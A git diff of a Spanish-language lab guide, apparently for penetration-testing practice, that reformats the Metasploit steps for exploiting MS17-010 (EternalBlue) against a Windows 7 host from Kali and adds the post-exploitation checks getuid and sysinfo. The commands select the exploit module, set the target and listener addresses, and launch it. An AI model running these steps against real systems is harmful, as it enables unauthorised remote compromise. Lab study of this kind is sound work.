@@ -24,20 +24,20 @@ Descubrimiento de puertos y verificación específica de MS17-010 mediante Nmap:
 
 
 Buscar el módulo de EternalBlue:
+  search ms17-010
 
 
-search ms17-010
 Seleccionar el exploit de EternalBlue para Windows 7:
+  use exploit/windows/smb/ms17_010_eternalblue
 
-use exploit/windows/smb/ms17_010_eternalblue
 Configurar los parámetros obligatorios de la red:
-
-options
-set RHOSTS <IP_WINDOWS_7>
-set LHOST <IP_KALI>
+  options
+    set RHOSTS <IP_WINDOWS_7>
+    set LHOST <IP_KALI>
 Verificar la configuración de las opciones y ejecutar la explotación:
-
-
-show options
-run  # (o `exploit`)
+  show options
+  run  # (o `exploit`)
+  
 Verificación de acceso tras obtener sesión de Meterpreter:
+  getuid
+  sysinfo
